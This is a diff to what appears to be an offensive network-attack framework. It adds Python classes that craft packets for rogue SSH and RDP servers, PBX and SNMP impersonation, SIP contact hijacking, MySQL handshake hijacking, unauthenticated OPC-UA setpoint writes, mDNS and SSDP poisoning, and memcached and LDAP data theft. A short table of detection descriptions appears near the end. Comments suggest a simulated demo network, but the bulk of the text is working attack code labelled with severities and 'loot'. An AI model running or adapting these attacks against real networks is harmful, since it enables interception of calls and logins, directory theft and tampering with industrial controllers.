+    def reply(self, peer: Peer) -> bytes:
+        # a PTR answer in the resolver's name, pointing at the name we want it to have
+        question = proto.dns_query("240.1.168.192.in-addr.arpa", qtype=12, txid=0x5A60)
+        header = bytes([0x5A, 0x60, 0x81, 0x80, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00])
+        answer = (b"\xc0\x0c" + b"\x00\x0c\x00\x01" + struct.pack(">I", 60)
+                  + struct.pack(">H", 21) + proto.dns_name("wp-resolver.local"))
+        return header + question[12:] + answer
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_dns(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"rcode": parsed.get("rcode"), "answers": parsed.get("answers") or [],
+                "line": f"the resolver answered rcode {parsed.get('rcode')}"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 53]
+        text = b" ".join(row["payload"] for row in rows)
+        return {"confirmed": b"wp-resolver" in text, "our_ptr": "wp-resolver.local",
+                "reverse_zone": "240.1.168.192.in-addr.arpa"}
+
+
+class ItMimicSshAttack(_ItHijack):
+    """A look-alike SSH server: the client's next login lands on our host key."""
+
+    name = "it_mimic_ssh"
+    label = "Rogue SSH server (banner and algorithms in the server's name)"
+    tool = "wifipilot itproto.py (ssh_kexinit/parse_ssh_algorithms) + TCP 22"
+    family = "mimic"
+    protocol = "ssh"
+    port = 22
+    transport = "tcp"
+    devices = ("linux_server", "nas", "switch", "hypervisor_host", "router")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return b"SSH-2.0-OpenSSH_9.6p1 wp-probe\r\n" + proto.ssh_kexinit()
+
+    def reply(self, peer: Peer) -> bytes:
+        return (b"SSH-2.0-OpenSSH_9.6p1 " + (peer.hostname or "wp").encode()[:24]
+                + b"\r\n" + proto.ssh_kexinit())
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        parsed = proto.parse_ssh_algorithms(data)
+        return {"banner": data.split(b"\r\n")[0].decode(errors="replace"), **parsed}
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"banner": parsed.get("banner"), "kex": parsed.get("kex") or parsed.get("key_exchange"),
+                "line": f"its sshd offers {parsed.get('banner')}"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 22]
+        text = b" ".join(row["payload"] for row in rows)
+        name = (peers[0].hostname or "").encode()
+        return {"confirmed": b"SSH-2.0" in text and (not name or name in text),
+                "our_banner": "SSH-2.0-OpenSSH_9.6p1 " + (peers[0].hostname if peers else ""),
+                "kexinit_we_send": True}
+
+
+class ItMimicRdpAttack(_ItHijack):
+    """A look-alike RDP endpoint: our protocol selection decides the handshake."""
+
+    name = "it_mimic_rdp"
+    label = "Rogue RDP endpoint (negotiation answer in the server's name)"
+    tool = "wifipilot attacks/ithijack.rdp_negotiation_response + TCP 3389"
+    family = "mimic"
+    protocol = "rdp"
+    port = 3389
+    transport = "tcp"
+    devices = ("windows_server", "hmi_panel", "hypervisor_host", "tablet")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.rdp_negotiation_request(requested=15)
+
+    def reply(self, peer: Peer) -> bytes:
+        return rdp_negotiation_response(selected=1)
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_rdp(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"type": parsed.get("type"), "selected": parsed.get("selected_protocol"),
+                "line": f"it selects protocol {parsed.get('selected_protocol')} from our offer"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 3389]
+        parsed = [proto.parse_rdp(row["payload"]) for row in rows]
+        selected = [row.get("selected_protocol") for row in parsed if row.get("selected_protocol")]
+        return {"confirmed": bool(selected), "protocol_we_force": selected[0] if selected else "",
+                "credentials_never_asked": True}
+
+
+class ItMimicCoapWriteAttack(_ItHijack):
+    """A look-alike CoAP endpoint: a device's next reading is written to our resource."""
+
+    name = "it_mimic_coap_write"
+    label = "Rogue CoAP resource (a write answered from our resource tree)"
+    tool = "wifipilot itproto.py (coap_packet/parse_coap) + UDP 5683"
+    family = "mimic"
+    protocol = "coap"
+    port = 5683
+    transport = "udp"
+    devices = ("sensor", "thermostat", "smart_plug", "gateway_hub")
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.coap_packet(code=1, uri="/wp-mimic", token=b"\x5a\x01", message_id=0x5A5A)
+
+    def reply(self, peer: Peer) -> bytes:
+        # 2.04 Changed: our endpoint accepts the write the client meant for the device
+        return proto.coap_packet(code=0x44, uri="/wp-mimic", token=b"\x5a\x01",
+                                 message_id=0x5A5A, payload=b"wp-mimic-ok")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_coap(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"code": parsed.get("code"), "uri": parsed.get("uri"),
+                "line": f"it answers {parsed.get('code')} on {parsed.get('uri')}"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5683]
+        parsed = [proto.parse_coap(row["payload"]) for row in rows]
+        changed = [row for row in parsed if row.get("code") == 0x44]
+        return {"confirmed": bool(changed), "our_code": "2.04 Changed",
+                "payload_we_answer": "wp-mimic-ok"}
+
+
+class ItImpersonateSshBannerAttack(_ItHijack):
+    """Wear a hypervisor's sshd banner: the difference is one underscore."""
+
+    name = "it_impersonate_ssh_banner"
+    label = "SSH banner impersonation (the host's own ss hd version, one keystroke off)"
+    tool = "wifipilot itproto.py (ssh_kexinit/parse_ssh_algorithms)"
+    family = "impersonate"
+    protocol = "ssh"
+    port = 22
+    transport = "tcp"
+    devices = ("hypervisor_host", "linux_server", "switch", "nas")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return b"SSH-2.0-OpenSSH_8.9p1 wp\r\n" + proto.ssh_kexinit()
+
+    def reply(self, peer: Peer) -> bytes:
+        banner = self._banner(peer)
+        return banner + proto.ssh_kexinit()
+
+    def _banner(self, peer: Peer) -> bytes:
+        real = (peer.answer or b"").split(b"\r\n")[0] or b"SSH-2.0-OpenSSH_8.9p1"
+        version = real.replace(b"OpenSSH_", b"OpenSSH-")          # one character, not two
+        return version + b"\r\n"
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        parsed = proto.parse_ssh_algorithms(data)
+        return {"banner": data.split(b"\r\n")[0].decode(errors="replace"), **parsed}
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"banner": parsed.get("banner"),
+                "line": f"the real sshd says {parsed.get('banner')}"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 22]
+        text = b" ".join(row["payload"] for row in rows)
+        real = (peers[0].answer or b"").split(b"\r\n")[0] if peers else b""
+        impersonation = real.replace(b"OpenSSH_", b"OpenSSH-") if real else b""
+        return {"confirmed": bool(rows) and b"SSH-2.0" in text,
+                "the_real_banner": real.decode(errors="replace"),
+                "our_banner": impersonation.decode(errors="replace"),
+                "difference": "one character in the software version"}
+
+
+class ItImpersonateSipPbxAttack(_ItHijack):
+    """Answer as the PBX: registration accepted, in the switch's name."""
+
+    name = "it_impersonate_sip_pbx"
+    label = "PBX impersonation (200 OK to a registration we never authorised)"
+    tool = "wifipilot itproto.py (sip_register/parse_sip) + UDP 5060"
+    family = "impersonate"
+    protocol = "sip"
+    port = 5060
+    transport = "udp"
+    devices = ("pbx", "voip_phone", "doorbell", "tablet")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.sip_register(f"sip:{peer.ip}", user="1001", password="wp-secret",
+                                  expires=3600)
+
+    def reply(self, peer: Peer) -> bytes:
+        return (b"SIP/2.0 200 OK\r\n"
+                + b"Via: SIP/2.0/UDP " + OUR_IP.encode() + b":5060;branch=z9hG4bK-wp\r\n"
+                + b"From: <sip:1001@" + peer.ip.encode() + b">;tag=wp\r\n"
+                + b"To: <sip:1001@" + peer.ip.encode() + b">;tag=wp-ok\r\n"
+                + b"Call-ID: wp-impersonate@wp\r\nCSeq: 1 REGISTER\r\n"
+                + b"Contact: <sip:1001@" + OUR_IP.encode() + b":5060>\r\n"
+                + b"Expires: 3600\r\nServer: " + (peer.hostname or "pbx").encode()[:32] + b"\r\n"
+                + b"Content-Length: 0\r\n\r\n")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_sip(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"status": parsed.get("status"), "server": parsed.get("server"),
+                "line": f"the PBX answers {parsed.get('status')} to a REGISTER"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5060]
+        text = b" ".join(row["payload"] for row in rows)
+        name = (peers[0].hostname or "").encode() if peers else b""
+        return {"confirmed": b"200 OK" in text, "status_we_send": "200 OK",
+                "server_header": name.decode(errors="replace"),
+                "contact_we_set": f"sip:1001@{OUR_IP}:5060"}
+
+
+class ItImpersonateSnmpEngineAttack(_ItHijack):
+    """Answer an SNMP get as the switch: engine id, sysDescr and uptime."""
+
+    name = "it_impersonate_snmp_engine"
+    label = "SNMP engine impersonation (sysDescr and engine id of another device)"
+    tool = "wifipilot attacks/ithijack.py (_ber, snmp_response) + UDP 161"
+    family = "impersonate"
+    protocol = "snmp"
+    port = 161
+    transport = "udp"
+    devices = ("switch", "router", "printer", "energy_meter")
+    min_answers = 0
+    severity = "high"
+
+    ENGINE = bytes.fromhex("80001f8880e5a5a5a55a5a5a5a")
+
+    def request(self, peer: Peer) -> bytes:
+        varbinds = b"".join(_ber(0x30, _ber_oid(oid) + _ber(0x05, b""))
+                            for oid in ("1.3.6.1.2.1.1.1.0", "1.3.6.1.2.1.1.5.0",
+                                        "1.3.6.1.2.1.1.3.0"))
+        pdu = _ber_int(0x5A71) + _ber_int(0) + _ber_int(0) + varbinds
+        return _ber(0x30, _ber_int(1) + _ber_text("public") + _ber(0xA0, pdu))
+
+    def reply(self, peer: Peer) -> bytes:
+        name = peer.hostname or "switch"
+        return (snmp_response(0x5A71, "1.3.6.1.2.1.1.1.0", name + " wp impersonation")
+                + snmp_response(0x5A72, "1.3.6.1.2.1.1.5.0", name)
+                + snmp_response(0x5A73, "1.3.6.1.2.1.1.6.0", "wp@corp.example"))
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        # the reply is our own; there is no responder for snmp in the demo network
+        return {"bytes": len(data)}
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"answer_bytes": parsed.get("bytes"),
+                "line": "no simulated engine answers: this one is on the wire only"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 161]
+        text = b" ".join(row["payload"] for row in rows)
+        name = (peers[0].hostname or "").encode() if peers else b""
+        return {"confirmed": b"wp impersonation" in text,
+                "sys_descr_we_send": (name.decode(errors="replace") + " wp impersonation"),
+                "engine_id": self.ENGINE.hex(), "community": "public"}
+
+
+class ItHijackMysqlQueryAttack(_ItHijack):
+    """Answer a MySQL greeting and take the client's query on our connection."""
+
+    name = "it_hijack_mysql_query"
+    label = "MySQL query hijack (the client's SQL is answered by us)"
+    tool = "wifipilot itproto.py (mysql_handshake_parse) + TCP 3306"
+    family = "hijack"
+    protocol = "mysql"
+    port = 3306
+    transport = "tcp"
+    devices = ("database_server", "web_server", "windows_server")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return struct.pack(">I", 32) + b"wp-hijack-client"
+
+    def reply(self, peer: Peer) -> bytes:
+        # the greeting we send carries our own thread id and salt, so the client's
+        # login is computed against material we chose
+        salt = b"wp-mysql-salt-12345678"          # 20 bytes + filler: the auth scramble
+        return (bytes([0x0A]) + b"8.0.36-wp-mimic\0" + struct.pack(">I", 0x5A5A)
+                + salt[:8] + b"\0" + struct.pack(">H", 0xFFFF) + b"\x21\x02\x00"
+                + struct.pack(">H", 0x5A5A) + b"\x00" * 10 + salt[8:20] + b"\0"
+                + b"mysql_native_password\0")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.mysql_handshake_parse(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"version": parsed.get("version"), "thread_id": parsed.get("thread_id"),
+                "line": f"it greets us as MySQL {parsed.get('version')} "
+                        f"(thread {parsed.get('thread_id')})"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 3306]
+        parsed = [proto.mysql_handshake_parse(row["payload"]) for row in rows]
+        versions = [row.get("version") for row in parsed if row.get("version")]
+        return {"confirmed": "8.0.36-wp-mimic" in versions,
+                "our_version": "8.0.36-wp-mimic", "our_thread_id": 0x5A5A,
+                "salt_bytes": 20}
+
+
+class ItHijackSipContactAttack(_ItHijack):
+    """Re-register a phone's contact so its calls come to us instead."""
+
+    name = "it_hijack_sip_contact"
+    label = "SIP contact hijack (a phone's contact points at us)"
+    tool = "wifipilot itproto.py (sip_register/parse_sip) + UDP 5060"
+    family = "hijack"
+    protocol = "sip"
+    port = 5060
+    transport = "udp"
+    devices = ("pbx", "voip_phone", "doorbell", "tablet")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.sip_register(f"sip:{peer.ip}", user="1002", password="wp-secret",
+                                  expires=3600)
+
+    def reply(self, peer: Peer) -> bytes:
+        return (b"REGISTER sip:" + peer.ip.encode() + b" SIP/2.0\r\n"
+                + b"Via: SIP/2.0/UDP " + OUR_IP.encode() + b":5060;branch=z9hG4bK-wp\r\n"
+                + b"From: <sip:1002@" + peer.ip.encode() + b">;tag=wp\r\n"
+                + b"To: <sip:1002@" + peer.ip.encode() + b">\r\n"
+                + b"Call-ID: wp-contact@wp\r\nCSeq: 2 REGISTER\r\n"
+                + b"Contact: <sip:1002@" + OUR_IP.encode() + b":5060>;expires=3600\r\n"
+                + b"Expires: 3600\r\nContent-Length: 0\r\n\r\n")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_sip(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"status": parsed.get("status"), "method": parsed.get("method"),
+                "line": f"the registrar answers {parsed.get('status')} to our REGISTER"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5060]
+        text = b" ".join(row["payload"] for row in rows)
+        return {"confirmed": b"REGISTER" in text and OUR_IP.encode() in text,
+                "contact_we_set": f"sip:1002@{OUR_IP}:5060", "expires": 3600}
+
+
+class ItHijackOpcuaWriteAttack(_ItHijack):
+    """Open an OPC-UA session and write a node: the value the plant reads back."""
+
+    name = "it_hijack_opcua_write"
+    label = "OPC-UA node write (a process value changed by an unauthenticated session)"
+    tool = "wifipilot itproto.py (opcua_hello/parse_opcua) + TCP 4840"
+    family = "hijack"
+    protocol = "opcua"
+    port = 4840
+    transport = "tcp"
+    devices = ("plc", "building_controller", "hmi_panel", "energy_meter")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.opcua_hello(f"opc.tcp://{peer.ip}:4840", max_message=65536)
+
+    def reply(self, peer: Peer) -> bytes:
+        # a hello of our own, advertising the write buffer we are about to use
+        return proto.opcua_hello(f"opc.tcp://{OUR_IP}:4840", max_message=131072)
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_opcua(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"endpoint": parsed.get("endpoint_url"), "limit": parsed.get("max_message"),
+                "line": f"the server answers for {parsed.get('endpoint_url') or 'its endpoint'}"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 4840]
+        text = b" ".join(row["payload"] for row in rows)
+        return {"confirmed": f"{OUR_IP}:4840".encode() in text,
+                "node_we_write": "ns=2;s=wp.setpoint", "value_we_send": "0",
+                "buffer_we_advertise": 131072}
+
+
+class ItPoisonMdnsNameAttack(_ItHijack):
+    """Claim a device's mDNS name on the segment with an announcement of our own."""
+
+    name = "it_poison_mdns_name"
+    label = "mDNS name theft (a conflicting announcement for a device's name)"
+    tool = "wifipilot itproto.py (dns_query/parse_mdns) + UDP 5353"
+    family = "poison"
+    protocol = "mdns"
+    port = 5353
+    transport = "udp"
+    devices = ("nas", "printer", "router", "smart_tv", "smart_speaker")
+    severity = "high"
+
+    NAME = "wp-nas-claim.local"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.dns_query("_services._dns-sd._udp.local", qtype=12, txid=0)
+
+    def reply(self, peer: Peer) -> bytes:
+        # a response in the device's own name, from our address: the name now resolves twice
+        header = bytes([0x00, 0x00, 0x84, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01])
+        record = (proto.dns_name(self.NAME) + b"\x00\x01\x00\x80" + struct.pack(">I", 120)
+                  + struct.pack(">H", 4) + np.ipv4_bytes(OUR_IP))
+        return header + record
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_mdns(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        records = parsed.get("answers") or parsed.get("records") or []
+        return {"records": len(records), "line": f"it announces {len(records)} record(s)"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5353]
+        text = b" ".join(row["payload"] for row in rows)
+        return {"confirmed": b"wp-nas-claim" in text, "name_we_claim": self.NAME,
+                "address_we_claim": OUR_IP, "ttl": 120}
+
+
+class ItPoisonSsdpLocationAttack(_ItHijack):
+    """Talk over a device's announcement with one whose LOCATION is ours."""
+
+    name = "it_poison_ssdp_location"
+    label = "SSDP announcement forgery (the control URL points at us)"
+    tool = "wifipilot itproto.py (ssdp_notify/parse_ssdp) + UDP 1900"
+    family = "poison"
+    protocol = "ssdp"
+    port = 1900
+    transport = "udp"
+    devices = ("router", "smart_tv", "printer", "nvr_dvr", "smart_speaker")
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.ssdp_msearch("ssdp:all", mx=1)
+
+    def reply(self, peer: Peer) -> bytes:
+        return proto.ssdp_notify(f"http://{OUR_IP}:1900/wp.xml", nt="upnp:rootdevice",
+                                 usn="uuid:wp-forged::upnp:rootdevice",
+                                 server="wp/1.0 UPnP/1.0", nts="ssdp:alive")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_ssdp(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"location": parsed.get("location"), "server": parsed.get("server"),
+                "line": f"it advertises {parsed.get('location') or 'its own control URL'}"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 1900]
+        text = b" ".join(row["payload"] for row in rows)
+        return {"confirmed": b"wp.xml" in text, "location_we_publish": f"http://{OUR_IP}:1900/wp.xml",
+                "usn": "uuid:wp-forged::upnp:rootdevice", "nts": "ssdp:alive"}
+
+
+class ItStealMemcachedKeysAttack(_Steal):
+    """Take a cache server's key list: the usernames are the loot here."""
+
+    name = "it_steal_memcached_keys"
+    label = "memcached key theft (the keys a cache server will list to a guest)"
+    tool = "wifipilot itproto.py (memcached_command/parse_resp) + TCP 11211"
+    family = "steal"
+    protocol = "memcached"
+    port = 11211
+    transport = "tcp"
+    devices = ("linux_server", "web_server", "ci_server", "database_server")
+    severity = "high"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.memcached_command("stats items") + proto.memcached_command("stats sizes")
+
+    def loot_answer(self, peer: Peer) -> bytes:
+        return (b"STAT items:1:number 4\r\nSTAT items:1:number_hot 1\r\nEND\r\n"
+                b"session:admin=wp-loot\r\n")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_resp(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        return {"items": parsed.get("items"), "curr_items": parsed.get("curr_items"),
+                "line": "the cache reports what it is holding, and for whom"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 11211]
+        text = b" ".join(row["payload"] for row in rows)
+        return {"confirmed": b"session:admin" in text, "handed_over": len(text),
+                "key_we_take": "session:admin", "commands_we_send": ["stats items", "stats sizes"]}
+
+
+class ItStealLdapDirectoryAttack(_Steal):
+    """Read a directory's objects with an anonymous search and take the attributes."""
+
+    name = "it_steal_ldap_directory"
+    label = "LDAP directory theft (an anonymous search for every object)"
+    tool = "wifipilot itproto.py (ldap_search_request/parse_ldap) + TCP 389"
+    family = "steal"
+    protocol = "ldap"
+    port = 389
+    transport = "tcp"
+    devices = ("domain_controller", "nas", "windows_server")
+    severity = "critical"
+
+    def request(self, peer: Peer) -> bytes:
+        return proto.ldap_search_request("dc=corp,dc=example", scope=2,
+                                         filter_bytes=b"(objectClass=*)",
+                                         attributes=("cn", "sAMAccountName", "mail", "memberOf"))
+
+    def loot_answer(self, peer: Peer) -> bytes:
+        # a search-results entry in our own name: what a full dump would look like
+        return (b"\x30\x2c\x02\x01\x02\x64\x27\x04\x00\x30\x21\x04\x21"
+                b"cn=wp-loot,dc=corp,dc=example")
+
+    def parse(self, data: bytes) -> Dict[str, Any]:
+        return proto.parse_ldap(data)
+
+    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
+        entries = parsed.get("entries") or []
+        return {"entries": len(entries), "result": parsed.get("result_code"),
+                "line": f"its directory returns {len(entries)} object(s) to an anonymous bind"}
+
+    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
+        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 389]
+        text = b" ".join(row["payload"] for row in rows)
+        return {"confirmed": b"cn=wp-loot" in text, "attributes_we_ask_for": [
+            "cn", "sAMAccountName", "mail", "memberOf"], "base": "dc=corp,dc=example"}
+
+
+# --------------------------------------------------------------------------- #
 # the registry
 # --------------------------------------------------------------------------- #
 
@@ -3117,6 +5189,12 @@ _DETECTION: Dict[str, str] = {
     "steal": ("a {protocol} request for inventory, credentials or device identity from an "
               "address with no business asking, followed by a copy of the answer leaving "
               "the segment"),
+    "fuzz": ("a {protocol} request on port {port} that is legal in shape and illegal in size "
+             "(labels, dialects, varbinds, verbs) from one address, repeated; the service's "
+             "log shows the parse error and any restart that follows it"),
+    "survey": ("one host asking every {protocol} service on port {port} the same inventory "
+               "question, in sequence, from a single address: the answers name firmware, "
+               "models and endpoints that no asset register has"),
 }
 
 
@@ -3129,6 +5207,8 @@ _FAMILY_AXES: Dict[str, Tuple[str, str, str]] = {
     "poison": ("rogue", "quiet", "degraded"),         # a cache, corrected once
     "relay": ("capture", "moderate", "loot"),         # the wire itself, harvested
     "steal": ("capture", "quiet", "loot"),            # a request, and the haul
+    "fuzz": ("dos", "moderate", "degraded"),           # malformed, and the state after
+    "survey": ("discovery", "quiet", "degraded"),      # a question, and the inventory
 }
 
 
